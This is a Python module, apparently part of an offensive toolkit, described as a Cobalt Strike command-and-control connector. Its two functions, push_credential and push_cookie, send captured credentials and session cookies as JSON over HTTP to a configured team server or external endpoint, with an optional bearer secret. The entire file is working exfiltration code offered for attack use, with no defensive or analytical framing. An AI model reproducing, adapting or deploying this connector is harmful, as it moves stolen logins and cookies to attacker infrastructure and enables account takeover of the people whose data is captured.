"""Cobalt Strike C2 connector.

Pushes captured credentials and cookies to a Cobalt Strike team server or an
external HTTP(S) API endpoint. The connector expects a config dict with at
least ``url``. ``password``/``secret`` and ``team_server`` are optional.
"""

import logging

import requests

logger = logging.getLogger(__name__)


def _headers(config: dict) -> dict:
    headers = {"Content-Type": "application/json"}
    secret = config.get("password") or config.get("secret")
    if secret:
        headers["Authorization"] = f"Bearer {secret}"
    return headers


def push_credential(payload: dict, config: dict) -> None:
    """POST a credential payload to the configured Cobalt Strike endpoint."""
    url = config.get("url")
    if not url:
        logger.warning("Cobalt Strike connector missing url")
        return

    body = {
        "type": "credential",
        "team_server": config.get("team_server"),
        "data": payload,
        "timestamp": payload.get("captured_at"),
    }

    try:
        resp = requests.post(url, json=body, headers=_headers(config), timeout=10)
        logger.info("Cobalt Strike credential push status: %s", resp.status_code)
    except Exception:
        logger.exception("Cobalt Strike credential push failed")


def push_cookie(payload: dict, config: dict) -> None:
    """POST a cookie payload to the configured Cobalt Strike endpoint."""
    url = config.get("url")
    if not url:
        logger.warning("Cobalt Strike connector missing url")
        return

    body = {
        "type": "cookie",
        "team_server": config.get("team_server"),
        "data": payload,
        "timestamp": payload.get("captured_at"),
    }

    try:
        resp = requests.post(url, json=body, headers=_headers(config), timeout=10)
        logger.info("Cobalt Strike cookie push status: %s", resp.status_code)
    except Exception:
        logger.exception("Cobalt Strike cookie push failed")
